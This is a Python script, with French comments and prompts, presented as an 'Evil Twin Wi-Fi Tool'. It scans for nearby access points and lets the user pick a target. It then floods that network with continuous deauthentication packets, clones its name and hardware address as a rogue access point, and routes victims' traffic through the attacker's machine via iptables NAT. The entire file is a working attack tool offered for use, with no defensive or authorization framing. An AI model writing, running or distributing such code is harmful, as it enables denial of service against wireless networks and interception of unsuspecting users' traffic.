#!/usr/bin/env python3
import os
import sys
import time
import signal
import subprocess
import threading
import re

SCAN_FILE = "/tmp/ipf_scan"

def banner():
    os.system("clear")
    print(r"""
          
 ██▓ ██▓███       █████▒██▓  ▄████  ██░ ██ ▄▄▄█████▓▓█████  ██▀███     
▓██▒▓██░  ██▒   ▓██   ▒▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   
▒██▒▓██░ ██▓▒   ▒████ ░▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   
░██░▒██▄█▓▒ ▒   ░▓█▒  ░░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     
░██░▒██▒ ░  ░   ░▒█░   ░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   
░▓  ▒▓▒░ ░  ░    ▒ ░   ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   
 ▒ ░░▒ ░         ░      ▒ ░  ░   ░  ▒ ░▒░ ░    ░     ░ ░  ░  ░▒ ░ ▒░   
 ▒ ░░░           ░ ░    ▒ ░░ ░   ░  ░  ░░ ░  ░         ░     ░░   ░    
 ░                      ░        ░  ░  ░  ░            ░  ░   ░        
                                                                          
        >>> IPFighter — Evil Twin Wi-Fi Tool by H8Laws <<<   
    """)

def list_interfaces():
    result = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True)
    interfaces = result.decode().strip().split('\n')
    return interfaces

def choose_interface(prompt):
    interfaces = list_interfaces()
    print("\n[+] Interfaces disponibles :")
    for i, iface in enumerate(interfaces):
        print(f"  {i}. {iface}")
    idx = int(input(f"\n[YELLOW][?] {prompt} : "))
    return interfaces[idx]

def kill_conflicts():
    print("\n[i] Killing NetworkManager & wpa_supplicant...\n")
    subprocess.call("airmon-ng check kill", shell=True)

def start_monitor(interface):
    """
    Utilise `airmon-ng start <interface>` et retourne le nom de l'interface monitor créée.
    Si on ne détecte pas de nouvelle interface, renvoie l'interface d'origine (fallback).
    """
    print(f"[+] Passage de {interface} en mode monitor avec airmon-ng...")
    try:
        before = set(list_interfaces())
    except Exception:
        before = set()
    try:
        # Lancer airmon-ng start
        # on utilise check_output pour capturer/afficher éventuellement les warnings
        out = subprocess.check_output(["airmon-ng", "start", interface], stderr=subprocess.STDOUT)
        # afficher éventuellement la sortie (utile pour debug)
        print(out.decode(errors="ignore"))
    except subprocess.CalledProcessError as e:
        # airmon-ng peut renvoyer des warnings => on continue malgré tout
        try:
            print(e.output.decode(errors="ignore"))
        except Exception:
            pass
    # petit délai pour que l'interface apparaisse
    time.sleep(1)
    try:
        after = set(list_interfaces())
    except Exception:
        after = set()

    # Cherche une nouvelle interface (après - avant)
    new = list(after - before)
    if not new:
        # pas de nouvelle interface détectée -> essaye heuristique "mon" dans le nom
        candidates = [iface for iface in after if "mon" in iface]
        if candidates:
            mon_iface = candidates[0]
            print(f"[+] Interface monitor détectée par heuristique : {mon_iface}")
            return mon_iface
        else:
            print("[!] Impossible de détecter une interface monitor — utilisation de l'interface d'origine en fallback.")
            return interface

    # Si plusieurs nouvelles, préfère celle contenant "mon", sinon retourne la première
    for iface in new:
        if "mon" in iface:
            print(f"[+] Interface monitor créée : {iface}")
            return iface
    print(f"[+] Interface monitor sélectionnée (aucun 'mon' trouvé) : {new[0]}")
    return new[0]

def restore_network():
    """
    Restaure NetworkManager/wpa_supplicant et tente d'arrêter toute interface monitor détectée
    via `airmon-ng stop` (heuristique : nom contenant 'mon'). Ne touche pas aux autres parties.
    """
    # Détecte interfaces monitor courantes (heuristique : 'mon' dans le nom)
    try:
        ifaces = list_interfaces()
    except Exception:
        ifaces = []
    mon_ifaces = [iface for iface in ifaces if "mon" in iface]
    for mon in mon_ifaces:
        print(f"[+] Tentative d'arrêt de l'interface monitor {mon} via airmon-ng stop ...")
        try:
            out = subprocess.check_output(["airmon-ng", "stop", mon], stderr=subprocess.STDOUT)
            print(out.decode(errors="ignore"))
        except subprocess.CalledProcessError as e:
            try:
                print(e.output.decode(errors="ignore"))
            except Exception:
                pass
    print("\n[+] Restauration du réseau (NetworkManager & wpa_supplicant)...")
    # redémarrage des services (commande peut varier selon distro)
    subprocess.call("service NetworkManager restart", shell=True)
    subprocess.call("service wpa_supplicant restart", shell=True)

def scan_aps(mon_iface):
    print("\n[+] Scan réseau Wi-Fi… (Ctrl+C pour stopper)")
    cmd = f"airodump-ng --write-interval 1 --write {SCAN_FILE} --output-format csv {mon_iface}"
    proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(10)
        proc.terminate()
    except KeyboardInterrupt:
        proc.terminate()
    aps = []
    try:
        with open(f"{SCAN_FILE}-01.csv", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            lines = content.splitlines()
            ap_section = False
            for line in lines:
                if "BSSID" in line and "ESSID" in line:
                    ap_section = True
                    continue
                if ap_section:
                    if line.strip() == "":
                        break
                    fields = line.split(",")
                    if len(fields) >= 14:
                        bssid = fields[0].strip()
                        channel = fields[3].strip()
                        essid = fields[13].strip()
                        if essid != "":
                            aps.append((bssid, channel, essid))
    except Exception as e:
        print(f"[!] Erreur lecture CSV : {e}")
    return aps

def select_ap(aps):
    print("\n   NUM   ESSID                 CH     BSSID")
    print("  ----  -------------------  ----  -------------------")
    for i, ap in enumerate(aps):
        print(f"  {i:<4}  {ap[2][:20]:<20}  {ap[1]:<4}  {ap[0]}")
    idx = int(input("\n[?] Choix de l’AP cible : "))
    return aps[idx]

def fake_ap(interface, ssid, bssid, channel):
    print(f"\n[+] Lancement du faux AP {ssid} sur canal {channel}…")
    os.system(f"iwconfig {interface} channel {channel}")
    subprocess.Popen(f"aireplay-ng --deauth 0 -a {bssid} {interface}", shell=True, stdout=subprocess.DEVNULL)
    cmd = f"airbase-ng -e \"{ssid}\" -a {bssid} -c {channel} {interface}"
    return subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL)

def setup_forwarding(inet_iface):
    print("[+] Redirection du trafic vers l’Internet via", inet_iface)
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    subprocess.call("iptables --flush", shell=True)
    subprocess.call("iptables --table nat --flush", shell=True)
    subprocess.call("iptables --delete-chain", shell=True)
    subprocess.call("iptables --table nat --delete-chain", shell=True)
    subprocess.call(f"iptables -t nat -A POSTROUTING -o {inet_iface} -j MASQUERADE", shell=True)
    subprocess.call("iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT", shell=True)
    subprocess.call("iptables -A FORWARD -j ACCEPT", shell=True)

def main():
    banner()
    inet_iface = choose_interface("Interface pour ACCÈS Internet (connexions actives OK)")
    banner()
    atk_iface = choose_interface("Interface pour ATTACK (mode monitor)")
    kill_conflicts()
    mon_iface = start_monitor(atk_iface)
    aps = scan_aps(mon_iface)
    if not aps:
        print("[-] Aucun AP détecté.")
        restore_network()
        return
    ap = select_ap(aps)
    bssid, channel, essid = ap
    proc_ap = fake_ap(mon_iface, essid, bssid, channel)
    try:
        setup_forwarding(inet_iface)
        print("\n[+] Evil Twin actif. Victimes connectables à :", essid)
        print("[*] Appuie sur Ctrl+C pour arrêter.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Arrêt…")
    finally:
        proc_ap.terminate()
        restore_network()

if __name__ == "__main__":
    main()
